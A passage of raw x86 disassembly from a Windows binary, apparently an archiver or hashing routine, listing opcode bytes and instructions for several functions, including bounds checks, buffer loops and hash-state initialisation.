  403a60:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403a62:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403a65:	e8 91 92 00 00       	call   0x40ccfb
  403a6a:	8b d0                	mov    %eax,%edx
  403a6c:	33 c0                	xor    %eax,%eax
  403a6e:	40                   	inc    %eax
  403a6f:	8a ca                	mov    %dl,%cl
  403a71:	22 c8                	and    %al,%cl
  403a73:	88 8b cd 6c 00 00    	mov    %cl,0x6ccd(%ebx)
  403a79:	8b ca                	mov    %edx,%ecx
  403a7b:	c1 e9 02             	shr    $0x2,%ecx
  403a7e:	22 c8                	and    %al,%cl
  403a80:	8b c2                	mov    %edx,%eax
  403a82:	c1 e8 04             	shr    $0x4,%eax
  403a85:	88 8b cc 6c 00 00    	mov    %cl,0x6ccc(%ebx)
  403a8b:	33 c9                	xor    %ecx,%ecx
  403a8d:	41                   	inc    %ecx
  403a8e:	22 c1                	and    %cl,%al
  403a90:	88 8b d2 6c 00 00    	mov    %cl,0x6cd2(%ebx)
  403a96:	88 83 cf 6c 00 00    	mov    %al,0x6ccf(%ebx)
  403a9c:	8b c2                	mov    %edx,%eax
  403a9e:	c1 e8 03             	shr    $0x3,%eax
  403aa1:	22 c1                	and    %cl,%al
  403aa3:	88 83 d3 6c 00 00    	mov    %al,0x6cd3(%ebx)
  403aa9:	33 c0                	xor    %eax,%eax
  403aab:	88 83 d0 6c 00 00    	mov    %al,0x6cd0(%ebx)
  403ab1:	f6 c2 02             	test   $0x2,%dl
  403ab4:	74 11                	je     0x403ac7
  403ab6:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403ab9:	e8 3d 92 00 00       	call   0x40ccfb
  403abe:	8b d0                	mov    %eax,%edx
  403ac0:	33 c9                	xor    %ecx,%ecx
  403ac2:	33 c0                	xor    %eax,%eax
  403ac4:	41                   	inc    %ecx
  403ac5:	eb 02                	jmp    0x403ac9
  403ac7:	8b d0                	mov    %eax,%edx
  403ac9:	89 93 f0 6c 00 00    	mov    %edx,0x6cf0(%ebx)
  403acf:	80 bb cd 6c 00 00 00 	cmpb   $0x0,0x6ccd(%ebx)
  403ad6:	74 04                	je     0x403adc
  403ad8:	85 d2                	test   %edx,%edx
  403ada:	74 02                	je     0x403ade
  403adc:	8a c8                	mov    %al,%cl
  403ade:	88 8b d1 6c 00 00    	mov    %cl,0x6cd1(%ebx)
  403ae4:	8b 4d 58             	mov    0x58(%ebp),%ecx
  403ae7:	8b c1                	mov    %ecx,%eax
  403ae9:	0b 45 54             	or     0x54(%ebp),%eax
  403aec:	74 13                	je     0x403b01
  403aee:	8d 83 20 22 00 00    	lea    0x2220(%ebx),%eax
  403af4:	50                   	push   %eax
  403af5:	51                   	push   %ecx
  403af6:	8d 45 30             	lea    0x30(%ebp),%eax
  403af9:	8b cb                	mov    %ebx,%ecx
  403afb:	50                   	push   %eax
  403afc:	e8 0f e7 ff ff       	call   0x402210
  403b01:	8b 45 48             	mov    0x48(%ebp),%eax
  403b04:	89 45 64             	mov    %eax,0x64(%ebp)
  403b07:	eb 07                	jmp    0x403b10
  403b09:	8b cb                	mov    %ebx,%ecx
  403b0b:	e8 c7 e5 ff ff       	call   0x4020d7
  403b10:	8d 4d 30             	lea    0x30(%ebp),%ecx
  403b13:	e8 e3 da ff ff       	call   0x4015fb
  403b18:	8b 45 64             	mov    0x64(%ebp),%eax
  403b1b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403b1e:	5f                   	pop    %edi
  403b1f:	5e                   	pop    %esi
  403b20:	5b                   	pop    %ebx
  403b21:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403b28:	83 c5 6c             	add    $0x6c,%ebp
  403b2b:	c9                   	leave
  403b2c:	c3                   	ret
  403b2d:	57                   	push   %edi
  403b2e:	8b f9                	mov    %ecx,%edi
  403b30:	80 bf dd 6c 00 00 00 	cmpb   $0x0,0x6cdd(%edi)
  403b37:	74 04                	je     0x403b3d
  403b39:	33 c0                	xor    %eax,%eax
  403b3b:	5f                   	pop    %edi
  403b3c:	c3                   	ret
  403b3d:	8b 07                	mov    (%edi),%eax
  403b3f:	56                   	push   %esi
  403b40:	8b 70 14             	mov    0x14(%eax),%esi
  403b43:	8b ce                	mov    %esi,%ecx
  403b45:	ff 15 78 32 43 00    	call   *0x433278
  403b4b:	8b cf                	mov    %edi,%ecx
  403b4d:	ff d6                	call   *%esi
  403b4f:	89 87 b8 6c 00 00    	mov    %eax,0x6cb8(%edi)
  403b55:	33 c9                	xor    %ecx,%ecx
  403b57:	8b 87 c8 6c 00 00    	mov    0x6cc8(%edi),%eax
  403b5d:	48                   	dec    %eax
  403b5e:	89 97 bc 6c 00 00    	mov    %edx,0x6cbc(%edi)
  403b64:	5e                   	pop    %esi
  403b65:	83 e8 01             	sub    $0x1,%eax
  403b68:	74 0e                	je     0x403b78
  403b6a:	83 e8 01             	sub    $0x1,%eax
  403b6d:	75 3d                	jne    0x403bac
  403b6f:	8b cf                	mov    %edi,%ecx
  403b71:	e8 81 f7 ff ff       	call   0x4032f7
  403b76:	eb 07                	jmp    0x403b7f
  403b78:	8b cf                	mov    %edi,%ecx
  403b7a:	e8 ec ec ff ff       	call   0x40286b
  403b7f:	8b c8                	mov    %eax,%ecx
  403b81:	85 c9                	test   %ecx,%ecx
  403b83:	74 27                	je     0x403bac
  403b85:	8b 87 c4 6c 00 00    	mov    0x6cc4(%edi),%eax
  403b8b:	3b 87 bc 6c 00 00    	cmp    0x6cbc(%edi),%eax
  403b91:	7f 23                	jg     0x403bb6
  403b93:	7c 0e                	jl     0x403ba3
  403b95:	8b 87 c0 6c 00 00    	mov    0x6cc0(%edi),%eax
  403b9b:	3b 87 b8 6c 00 00    	cmp    0x6cb8(%edi),%eax
  403ba1:	77 13                	ja     0x403bb6
  403ba3:	8b cf                	mov    %edi,%ecx
  403ba5:	e8 2d e5 ff ff       	call   0x4020d7
  403baa:	33 c9                	xor    %ecx,%ecx
  403bac:	c7 87 f4 21 00 00 ff 	movl   $0xff,0x21f4(%edi)
  403bb3:	00 00 00 
  403bb6:	8b c1                	mov    %ecx,%eax
  403bb8:	5f                   	pop    %edi
  403bb9:	c3                   	ret
  403bba:	b8 da 26 43 00       	mov    $0x4326da,%eax
  403bbf:	e8 b4 af 01 00       	call   0x41eb78
  403bc4:	b8 e0 e6 00 00       	mov    $0xe6e0,%eax
  403bc9:	e8 82 b0 01 00       	call   0x41ec50
  403bce:	56                   	push   %esi
  403bcf:	8b f1                	mov    %ecx,%esi
  403bd1:	80 be dc 6c 00 00 00 	cmpb   $0x0,0x6cdc(%esi)
  403bd8:	74 1c                	je     0x403bf6
  403bda:	8d 46 32             	lea    0x32(%esi),%eax
  403bdd:	50                   	push   %eax
  403bde:	6a 1d                	push   $0x1d
  403be0:	e8 a6 d7 ff ff       	call   0x40138b
  403be5:	6a 03                	push   $0x3
  403be7:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403bec:	e8 92 31 00 00       	call   0x406d83
  403bf1:	e9 66 02 00 00       	jmp    0x403e5c
  403bf6:	80 be 08 46 00 00 05 	cmpb   $0x5,0x4608(%esi)
  403bfd:	0f 87 4e 02 00 00    	ja     0x403e51
  403c03:	33 c0                	xor    %eax,%eax
  403c05:	83 be c8 6c 00 00 03 	cmpl   $0x3,0x6cc8(%esi)
  403c0c:	0f 95 c0             	setne  %al
  403c0f:	48                   	dec    %eax
  403c10:	83 e0 15             	and    $0x15,%eax
  403c13:	83 c0 1d             	add    $0x1d,%eax
  403c16:	39 86 04 46 00 00    	cmp    %eax,0x4604(%esi)
  403c1c:	0f 87 2f 02 00 00    	ja     0x403e51
  403c22:	8b 86 40 56 00 00    	mov    0x5640(%esi),%eax
  403c28:	0b 86 44 56 00 00    	or     0x5644(%esi),%eax
  403c2e:	75 0f                	jne    0x403c3f
  403c30:	38 86 81 56 00 00    	cmp    %al,0x5681(%esi)
  403c36:	75 07                	jne    0x403c3f
  403c38:	b0 01                	mov    $0x1,%al
  403c3a:	e9 1f 02 00 00       	jmp    0x403e5e
  403c3f:	53                   	push   %ebx
  403c40:	8d 9e f8 20 00 00    	lea    0x20f8(%esi),%ebx
  403c46:	57                   	push   %edi
  403c47:	8b cb                	mov    %ebx,%ecx
  403c49:	e8 86 93 00 00       	call   0x40cfd4
  403c4e:	53                   	push   %ebx
  403c4f:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  403c55:	e8 2f e4 00 00       	call   0x412089
  403c5a:	33 db                	xor    %ebx,%ebx
  403c5c:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  403c62:	53                   	push   %ebx
  403c63:	ff b6 dc 56 00 00    	push   0x56dc(%esi)
  403c69:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403c6c:	e8 06 f7 00 00       	call   0x413377
  403c71:	8b 7d 08             	mov    0x8(%ebp),%edi
  403c74:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  403c77:	75 53                	jne    0x403ccc
  403c79:	39 9e 4c 56 00 00    	cmp    %ebx,0x564c(%esi)
  403c7f:	7c 1e                	jl     0x403c9f
  403c81:	7f 0c                	jg     0x403c8f
  403c83:	81 be 48 56 00 00 00 	cmpl   $0x1000000,0x5648(%esi)
  403c8a:	00 00 01 
  403c8d:	76 10                	jbe    0x403c9f
  403c8f:	8d 46 32             	lea    0x32(%esi),%eax
  403c92:	50                   	push   %eax
  403c93:	6a 1e                	push   $0x1e
  403c95:	e8 f1 d6 ff ff       	call   0x40138b
  403c9a:	e9 a1 01 00 00       	jmp    0x403e40
  403c9f:	85 ff                	test   %edi,%edi
  403ca1:	75 09                	jne    0x403cac
  403ca3:	c6 86 29 21 00 00 01 	movb   $0x1,0x2129(%esi)
  403caa:	eb 20                	jmp    0x403ccc
  403cac:	ff b6 48 56 00 00    	push   0x5648(%esi)
  403cb2:	8b cf                	mov    %edi,%ecx
  403cb4:	e8 04 e4 ff ff       	call   0x4020bd
  403cb9:	ff b6 48 56 00 00    	push   0x5648(%esi)
  403cbf:	8d 8e f8 20 00 00    	lea    0x20f8(%esi),%ecx
  403cc5:	ff 37                	push   (%edi)
  403cc7:	e8 ea 93 00 00       	call   0x40d0b6
  403ccc:	38 9e 83 56 00 00    	cmp    %bl,0x5683(%esi)
  403cd2:	74 5a                	je     0x403d2e
  403cd4:	8b 96 d4 21 00 00    	mov    0x21d4(%esi),%edx
  403cda:	38 9a 24 61 00 00    	cmp    %bl,0x6124(%edx)
  403ce0:	0f 84 5a 01 00 00    	je     0x403e40
  403ce6:	8d 86 aa 56 00 00    	lea    0x56aa(%esi),%eax
  403cec:	50                   	push   %eax
  403ced:	8d 8e b3 56 00 00    	lea    0x56b3(%esi),%ecx
  403cf3:	51                   	push   %ecx
  403cf4:	ff b6 d4 56 00 00    	push   0x56d4(%esi)
  403cfa:	0f b6 8e 88 56 00 00 	movzbl 0x5688(%esi),%ecx
  403d01:	8d 86 99 56 00 00    	lea    0x5699(%esi),%eax
  403d07:	50                   	push   %eax
  403d08:	f7 d9                	neg    %ecx
  403d0a:	8d 86 89 56 00 00    	lea    0x5689(%esi),%eax
  403d10:	1b c9                	sbb    %ecx,%ecx
  403d12:	23 c8                	and    %eax,%ecx
  403d14:	8d 82 24 60 00 00    	lea    0x6024(%edx),%eax
  403d1a:	51                   	push   %ecx
  403d1b:	50                   	push   %eax
  403d1c:	ff b6 84 56 00 00    	push   0x5684(%esi)
  403d22:	8d 8e f8 20 00 00    	lea    0x20f8(%esi),%ecx
  403d28:	53                   	push   %ebx
  403d29:	e8 23 93 00 00       	call   0x40d051
  403d2e:	6a 01                	push   $0x1
  403d30:	ff b6 58 56 00 00    	push   0x5658(%esi)
  403d36:	8d 8e b8 21 00 00    	lea    0x21b8(%esi),%ecx
  403d3c:	e8 d9 6d 00 00       	call   0x40ab1a
  403d41:	8b 8e 44 56 00 00    	mov    0x5644(%esi),%ecx
  403d47:	ff 75 0c             	push   0xc(%ebp)
  403d4a:	8b 86 40 56 00 00    	mov    0x5640(%esi),%eax
  403d50:	89 8e 24 21 00 00    	mov    %ecx,0x2124(%esi)
  403d56:	89 8e 1c 21 00 00    	mov    %ecx,0x211c(%esi)
  403d5c:	8d 8e f8 20 00 00    	lea    0x20f8(%esi),%ecx
  403d62:	56                   	push   %esi
  403d63:	89 86 20 21 00 00    	mov    %eax,0x2120(%esi)
  403d69:	89 86 18 21 00 00    	mov    %eax,0x2118(%esi)
  403d6f:	88 9e 28 21 00 00    	mov    %bl,0x2128(%esi)
  403d75:	e8 1f 93 00 00       	call   0x40d099
  403d7a:	8a 45 10             	mov    0x10(%ebp),%al
  403d7d:	88 86 29 21 00 00    	mov    %al,0x2129(%esi)
  403d83:	8a 86 81 56 00 00    	mov    0x5681(%esi),%al
  403d89:	88 86 4f 21 00 00    	mov    %al,0x214f(%esi)
  403d8f:	8d 86 e8 45 00 00    	lea    0x45e8(%esi),%eax
  403d95:	89 86 38 21 00 00    	mov    %eax,0x2138(%esi)
  403d9b:	89 9e 3c 21 00 00    	mov    %ebx,0x213c(%esi)
  403da1:	8b 86 48 56 00 00    	mov    0x5648(%esi),%eax
  403da7:	8b 8e 4c 56 00 00    	mov    0x564c(%esi),%ecx
  403dad:	89 85 5c 65 ff ff    	mov    %eax,-0x9aa4(%ebp)
  403db3:	89 8d 60 65 ff ff    	mov    %ecx,-0x9aa0(%ebp)
  403db9:	88 9d 74 65 ff ff    	mov    %bl,-0x9a8c(%ebp)
  403dbf:	38 9e 08 46 00 00    	cmp    %bl,0x4608(%esi)
  403dc5:	75 10                	jne    0x403dd7
  403dc7:	51                   	push   %ecx
  403dc8:	50                   	push   %eax
  403dc9:	8d 86 f8 20 00 00    	lea    0x20f8(%esi),%eax
  403dcf:	50                   	push   %eax
  403dd0:	e8 40 54 00 00       	call   0x409215
  403dd5:	eb 12                	jmp    0x403de9
  403dd7:	53                   	push   %ebx
  403dd8:	ff b6 04 46 00 00    	push   0x4604(%esi)
  403dde:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  403de4:	e8 37 f2 00 00       	call   0x413020
  403de9:	0f b6 86 b2 56 00 00 	movzbl 0x56b2(%esi),%eax
  403df0:	8d 96 b3 56 00 00    	lea    0x56b3(%esi),%edx
  403df6:	f7 d8                	neg    %eax
  403df8:	8d 8e b8 21 00 00    	lea    0x21b8(%esi),%ecx
  403dfe:	1b c0                	sbb    %eax,%eax
  403e00:	23 c2                	and    %edx,%eax
  403e02:	50                   	push   %eax
  403e03:	8d 86 58 56 00 00    	lea    0x5658(%esi),%eax
  403e09:	50                   	push   %eax
  403e0a:	e8 db 6c 00 00       	call   0x40aaea
  403e0f:	84 c0                	test   %al,%al
  403e11:	75 2b                	jne    0x403e3e
  403e13:	8d 86 10 46 00 00    	lea    0x4610(%esi),%eax
  403e19:	50                   	push   %eax
  403e1a:	8d 46 32             	lea    0x32(%esi),%eax
  403e1d:	50                   	push   %eax
  403e1e:	6a 1f                	push   $0x1f
  403e20:	e8 fc e1 ff ff       	call   0x402021
  403e25:	6a 03                	push   $0x3
  403e27:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403e2c:	e8 52 2f 00 00       	call   0x406d83
  403e31:	85 ff                	test   %edi,%edi
  403e33:	74 0b                	je     0x403e40
  403e35:	8b cf                	mov    %edi,%ecx
  403e37:	e8 a2 00 00 00       	call   0x403ede
  403e3c:	eb 02                	jmp    0x403e40
  403e3e:	b3 01                	mov    $0x1,%bl
  403e40:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  403e46:	e8 4c e4 00 00       	call   0x412297
  403e4b:	5f                   	pop    %edi
  403e4c:	8a c3                	mov    %bl,%al
  403e4e:	5b                   	pop    %ebx
  403e4f:	eb 0d                	jmp    0x403e5e
  403e51:	8d 46 32             	lea    0x32(%esi),%eax
  403e54:	50                   	push   %eax
  403e55:	6a 1e                	push   $0x1e
  403e57:	e8 2f d5 ff ff       	call   0x40138b
  403e5c:	32 c0                	xor    %al,%al
  403e5e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403e61:	5e                   	pop    %esi
  403e62:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403e69:	c9                   	leave
  403e6a:	c2 0c 00             	ret    $0xc
  403e6d:	55                   	push   %ebp
  403e6e:	8b ec                	mov    %esp,%ebp
  403e70:	83 ec 4c             	sub    $0x4c,%esp
  403e73:	57                   	push   %edi
  403e74:	8b f9                	mov    %ecx,%edi
  403e76:	8b 87 d4 21 00 00    	mov    0x21d4(%edi),%eax
  403e7c:	80 b8 24 61 00 00 00 	cmpb   $0x0,0x6124(%eax)
  403e83:	75 56                	jne    0x403edb
  403e85:	05 24 60 00 00       	add    $0x6024,%eax
  403e8a:	50                   	push   %eax
  403e8b:	8d 47 32             	lea    0x32(%edi),%eax
  403e8e:	50                   	push   %eax
  403e8f:	6a 02                	push   $0x2
  403e91:	e8 ac dc 00 00       	call   0x411b42
  403e96:	84 c0                	test   %al,%al
  403e98:	75 34                	jne    0x403ece
  403e9a:	8b 07                	mov    (%edi),%eax
  403e9c:	56                   	push   %esi
  403e9d:	8b 70 08             	mov    0x8(%eax),%esi
  403ea0:	8b ce                	mov    %esi,%ecx
  403ea2:	ff 15 78 32 43 00    	call   *0x433278
  403ea8:	8b cf                	mov    %edi,%ecx
  403eaa:	ff d6                	call   *%esi
  403eac:	6a 02                	push   $0x2
  403eae:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403eb1:	e8 10 d7 ff ff       	call   0x4015c6
  403eb6:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403eb9:	e8 40 d7 00 00       	call   0x4115fe
  403ebe:	68 ff 00 00 00       	push   $0xff
  403ec3:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403ec8:	e8 64 2d 00 00       	call   0x406c31
  403ecd:	5e                   	pop    %esi
  403ece:	8b 87 d4 21 00 00    	mov    0x21d4(%edi),%eax
  403ed4:	c6 80 28 61 00 00 01 	movb   $0x1,0x6128(%eax)
  403edb:	5f                   	pop    %edi
  403edc:	c9                   	leave
  403edd:	c3                   	ret
  403ede:	56                   	push   %esi
  403edf:	8b f1                	mov    %ecx,%esi
  403ee1:	83 3e 00             	cmpl   $0x0,(%esi)
  403ee4:	74 0b                	je     0x403ef1
  403ee6:	ff 36                	push   (%esi)
  403ee8:	e8 41 ff 01 00       	call   0x423e2e
  403eed:	83 26 00             	andl   $0x0,(%esi)
  403ef0:	59                   	pop    %ecx
  403ef1:	83 66 04 00          	andl   $0x0,0x4(%esi)
  403ef5:	83 66 08 00          	andl   $0x0,0x8(%esi)
  403ef9:	5e                   	pop    %esi
  403efa:	c3                   	ret
  403efb:	55                   	push   %ebp
  403efc:	8b ec                	mov    %esp,%ebp
  403efe:	8b 55 0c             	mov    0xc(%ebp),%edx
  403f01:	53                   	push   %ebx
  403f02:	85 d2                	test   %edx,%edx
  403f04:	7c 37                	jl     0x403f3d
  403f06:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f09:	7f 04                	jg     0x403f0f
  403f0b:	85 c9                	test   %ecx,%ecx
  403f0d:	72 2e                	jb     0x403f3d
  403f0f:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403f13:	7c 28                	jl     0x403f3d
  403f15:	7f 06                	jg     0x403f1d
  403f17:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403f1b:	72 20                	jb     0x403f3d
  403f1d:	83 cb ff             	or     $0xffffffff,%ebx
  403f20:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  403f25:	2b 5d 10             	sub    0x10(%ebp),%ebx
  403f28:	1b 45 14             	sbb    0x14(%ebp),%eax
  403f2b:	3b d0                	cmp    %eax,%edx
  403f2d:	7f 0e                	jg     0x403f3d
  403f2f:	7c 04                	jl     0x403f35
  403f31:	3b cb                	cmp    %ebx,%ecx
  403f33:	77 08                	ja     0x403f3d
  403f35:	03 4d 10             	add    0x10(%ebp),%ecx
  403f38:	13 55 14             	adc    0x14(%ebp),%edx
  403f3b:	eb 06                	jmp    0x403f43
  403f3d:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403f40:	8b 55 1c             	mov    0x1c(%ebp),%edx
  403f43:	8b c1                	mov    %ecx,%eax
  403f45:	5b                   	pop    %ebx
  403f46:	5d                   	pop    %ebp
  403f47:	c2 18 00             	ret    $0x18
  403f4a:	53                   	push   %ebx
  403f4b:	55                   	push   %ebp
  403f4c:	56                   	push   %esi
  403f4d:	57                   	push   %edi
  403f4e:	8b f1                	mov    %ecx,%esi
  403f50:	33 db                	xor    %ebx,%ebx
  403f52:	e8 d6 fb ff ff       	call   0x403b2d
  403f57:	8b f8                	mov    %eax,%edi
  403f59:	85 ff                	test   %edi,%edi
  403f5b:	74 39                	je     0x403f96
  403f5d:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403f61:	83 fd 05             	cmp    $0x5,%ebp
  403f64:	74 09                	je     0x403f6f
  403f66:	83 be f4 21 00 00 05 	cmpl   $0x5,0x21f4(%esi)
  403f6d:	74 27                	je     0x403f96
  403f6f:	43                   	inc    %ebx
  403f70:	f6 c3 7f             	test   $0x7f,%bl
  403f73:	75 05                	jne    0x403f7a
  403f75:	e8 8e ce 00 00       	call   0x410e08
  403f7a:	39 ae f4 21 00 00    	cmp    %ebp,0x21f4(%esi)
  403f80:	74 1d                	je     0x403f9f
  403f82:	8b ce                	mov    %esi,%ecx
  403f84:	e8 be df ff ff       	call   0x401f47
  403f89:	8b ce                	mov    %esi,%ecx
  403f8b:	e8 9d fb ff ff       	call   0x403b2d
  403f90:	8b f8                	mov    %eax,%edi
  403f92:	85 ff                	test   %edi,%edi
  403f94:	75 cb                	jne    0x403f61
  403f96:	33 c0                	xor    %eax,%eax
  403f98:	5f                   	pop    %edi
  403f99:	5e                   	pop    %esi
  403f9a:	5d                   	pop    %ebp
  403f9b:	5b                   	pop    %ebx
  403f9c:	c2 04 00             	ret    $0x4
  403f9f:	8b c7                	mov    %edi,%eax
  403fa1:	eb f5                	jmp    0x403f98
  403fa3:	53                   	push   %ebx
  403fa4:	56                   	push   %esi
  403fa5:	57                   	push   %edi
  403fa6:	8b f1                	mov    %ecx,%esi
  403fa8:	33 db                	xor    %ebx,%ebx
  403faa:	eb 39                	jmp    0x403fe5
  403fac:	83 be f4 21 00 00 05 	cmpl   $0x5,0x21f4(%esi)
  403fb3:	74 3b                	je     0x403ff0
  403fb5:	43                   	inc    %ebx
  403fb6:	f6 c3 7f             	test   $0x7f,%bl
  403fb9:	75 05                	jne    0x403fc0
  403fbb:	e8 48 ce 00 00       	call   0x410e08
  403fc0:	83 be f4 21 00 00 03 	cmpl   $0x3,0x21f4(%esi)
  403fc7:	75 13                	jne    0x403fdc
  403fc9:	ff 74 24 10          	push   0x10(%esp)
  403fcd:	8d 8e e8 45 00 00    	lea    0x45e8(%esi),%ecx
  403fd3:	e8 22 e1 ff ff       	call   0x4020fa
  403fd8:	84 c0                	test   %al,%al
  403fda:	75 1c                	jne    0x403ff8
  403fdc:	8b ce                	mov    %esi,%ecx
  403fde:	e8 64 df ff ff       	call   0x401f47
  403fe3:	8b ce                	mov    %esi,%ecx
  403fe5:	e8 43 fb ff ff       	call   0x403b2d
  403fea:	8b f8                	mov    %eax,%edi
  403fec:	85 ff                	test   %edi,%edi
  403fee:	75 bc                	jne    0x403fac
  403ff0:	33 c0                	xor    %eax,%eax
  403ff2:	5f                   	pop    %edi
  403ff3:	5e                   	pop    %esi
  403ff4:	5b                   	pop    %ebx
  403ff5:	c2 04 00             	ret    $0x4
  403ff8:	8b c7                	mov    %edi,%eax
  403ffa:	eb f6                	jmp    0x403ff2
  403ffc:	56                   	push   %esi
  403ffd:	8b f1                	mov    %ecx,%esi
  403fff:	e8 16 58 00 00       	call   0x40981a
  404004:	39 86 b8 6c 00 00    	cmp    %eax,0x6cb8(%esi)
  40400a:	75 18                	jne    0x404024
  40400c:	39 96 bc 6c 00 00    	cmp    %edx,0x6cbc(%esi)
  404012:	75 10                	jne    0x404024
  404014:	39 86 c0 6c 00 00    	cmp    %eax,0x6cc0(%esi)
  40401a:	75 08                	jne    0x404024
  40401c:	39 96 c4 6c 00 00    	cmp    %edx,0x6cc4(%esi)
  404022:	74 17                	je     0x40403b
  404024:	8d 46 32             	lea    0x32(%esi),%eax
  404027:	50                   	push   %eax
  404028:	6a 38                	push   $0x38
  40402a:	e8 5c d3 ff ff       	call   0x40138b
  40402f:	6a 01                	push   $0x1
  404031:	b9 98 10 44 00       	mov    $0x441098,%ecx
  404036:	e8 48 2d 00 00       	call   0x406d83
  40403b:	5e                   	pop    %esi
  40403c:	c3                   	ret
  40403d:	ff 74 24 08          	push   0x8(%esp)
  404041:	8d 41 32             	lea    0x32(%ecx),%eax
  404044:	ff 74 24 08          	push   0x8(%esp)
  404048:	50                   	push   %eax
  404049:	6a 22                	push   $0x22
  40404b:	e8 13 e0 ff ff       	call   0x402063
  404050:	6a 01                	push   $0x1
  404052:	b9 98 10 44 00       	mov    $0x441098,%ecx
  404057:	e8 27 2d 00 00       	call   0x406d83
  40405c:	c2 08 00             	ret    $0x8
  40405f:	b8 f0 ef 43 00       	mov    $0x43eff0,%eax
  404064:	c3                   	ret
  404065:	55                   	push   %ebp
  404066:	8b ec                	mov    %esp,%ebp
  404068:	ff 75 18             	push   0x18(%ebp)
  40406b:	ff 75 14             	push   0x14(%ebp)
  40406e:	ff 75 10             	push   0x10(%ebp)
  404071:	ff 75 0c             	push   0xc(%ebp)
  404074:	ff 75 08             	push   0x8(%ebp)
  404077:	e8 e3 ff ff ff       	call   0x40405f
  40407c:	ff 70 04             	push   0x4(%eax)
  40407f:	ff 30                	push   (%eax)
  404081:	e8 4e 1f 02 00       	call   0x425fd4
  404086:	83 c4 1c             	add    $0x1c,%esp
  404089:	85 c0                	test   %eax,%eax
  40408b:	79 03                	jns    0x404090
  40408d:	83 c8 ff             	or     $0xffffffff,%eax
  404090:	5d                   	pop    %ebp
  404091:	c3                   	ret
  404092:	8d 44 24 10          	lea    0x10(%esp),%eax
  404096:	50                   	push   %eax
  404097:	6a 00                	push   $0x0
  404099:	ff 74 24 14          	push   0x14(%esp)
  40409d:	ff 74 24 14          	push   0x14(%esp)
  4040a1:	ff 74 24 14          	push   0x14(%esp)
  4040a5:	e8 bb ff ff ff       	call   0x404065
  4040aa:	83 c4 14             	add    $0x14,%esp
  4040ad:	c3                   	ret
  4040ae:	cc                   	int3
  4040af:	cc                   	int3
  4040b0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4040b4:	e8 03 00 00 00       	call   0x4040bc
  4040b9:	c2 04 00             	ret    $0x4
  4040bc:	53                   	push   %ebx
  4040bd:	55                   	push   %ebp
  4040be:	8b d9                	mov    %ecx,%ebx
  4040c0:	bd 00 02 00 00       	mov    $0x200,%ebp
  4040c5:	56                   	push   %esi
  4040c6:	57                   	push   %edi
  4040c7:	8b 73 08             	mov    0x8(%ebx),%esi
  4040ca:	8b 7b 04             	mov    0x4(%ebx),%edi
  4040cd:	eb 26                	jmp    0x4040f5
  4040cf:	83 3d d8 81 44 00 01 	cmpl   $0x1,0x4481d8
  4040d6:	7c 0f                	jl     0x4040e7
  4040d8:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  4040de:	72 07                	jb     0x4040e7
  4040e0:	0f 18 8f 00 02 00 00 	prefetcht0 0x200(%edi)
  4040e7:	6a 40                	push   $0x40
  4040e9:	57                   	push   %edi
  4040ea:	ff 33                	push   (%ebx)
  4040ec:	e8 78 16 00 00       	call   0x405769
  4040f1:	03 fd                	add    %ebp,%edi
  4040f3:	2b f5                	sub    %ebp,%esi
  4040f5:	3b f5                	cmp    %ebp,%esi
  4040f7:	73 d6                	jae    0x4040cf
  4040f9:	5f                   	pop    %edi
  4040fa:	5e                   	pop    %esi
  4040fb:	5d                   	pop    %ebp
  4040fc:	5b                   	pop    %ebx
  4040fd:	c3                   	ret
  4040fe:	81 ec cc 00 00 00    	sub    $0xcc,%esp
  404104:	8b 94 24 d0 00 00 00 	mov    0xd0(%esp),%edx
  40410b:	53                   	push   %ebx
  40410c:	55                   	push   %ebp
  40410d:	56                   	push   %esi
  40410e:	8b 82 f8 00 00 00    	mov    0xf8(%edx),%eax
  404114:	8b b4 24 e0 00 00 00 	mov    0xe0(%esp),%esi
  40411b:	57                   	push   %edi
  40411c:	6a 10                	push   $0x10
  40411e:	8b 18                	mov    (%eax),%ebx
  404120:	8d bc 24 a0 00 00 00 	lea    0xa0(%esp),%edi
  404127:	8b 68 04             	mov    0x4(%eax),%ebp
  40412a:	81 f3 7f 52 0e 51    	xor    $0x510e527f,%ebx
  404130:	8b 82 fc 00 00 00    	mov    0xfc(%edx),%eax
  404136:	81 f5 8c 68 05 9b    	xor    $0x9b05688c,%ebp
  40413c:	59                   	pop    %ecx
  40413d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40413f:	8b b2 f4 00 00 00    	mov    0xf4(%edx),%esi
  404145:	8d 7c 24 5c          	lea    0x5c(%esp),%edi
  404149:	6a 08                	push   $0x8
  40414b:	59                   	pop    %ecx
  40414c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40414e:	8b 08                	mov    (%eax),%ecx
  404150:	8b 40 04             	mov    0x4(%eax),%eax
  404153:	81 f1 ab d9 83 1f    	xor    $0x1f83d9ab,%ecx
  404159:	35 19 cd e0 5b       	xor    $0x5be0cd19,%eax
  40415e:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  404162:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  404166:	33 f6                	xor    %esi,%esi
